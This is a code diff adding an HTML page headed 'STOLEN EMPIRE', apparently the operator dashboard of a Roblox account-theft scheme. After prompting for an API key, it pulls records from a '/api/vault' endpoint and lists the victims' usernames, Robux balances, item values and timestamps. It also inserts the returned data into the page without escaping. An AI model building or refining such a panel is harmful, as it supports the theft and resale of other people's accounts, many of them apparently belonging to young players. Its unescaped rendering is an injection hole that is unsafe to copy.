@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>👑 Throne</title>
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+    .log { background: #111; margin: 10px; padding: 15px; border-left: 4px solid #0f0; }
+    .avatar { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #0f0; float: left; margin-right: 15px; }
+  </style>
+</head>
+<body>
+  <h1>STOLEN EMPIRE</h1>
+  <button onclick="load()">Refresh</button>
+  <div id="logs"></div>
+
+  <script>
+    const key = btoa(prompt('API Key:'));
+    function load() {
+      fetch(`/api/vault?key=${key}`).then(r => r.json()).then(data => {
+        document.getElementById('logs').innerHTML = data.map(l => `
+          <div class="log">
+            <img src="/avatar/${l.userId}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'">
+            <b>${l.username}</b> | Robux: ${l.robux} | RAP: ${l.rap}<br>
+            <small>${l.timestamp}</small>
+          </div>
+        `).join('');
+      });
+    }
+    load();
+  </script>
+</body>
+</html>
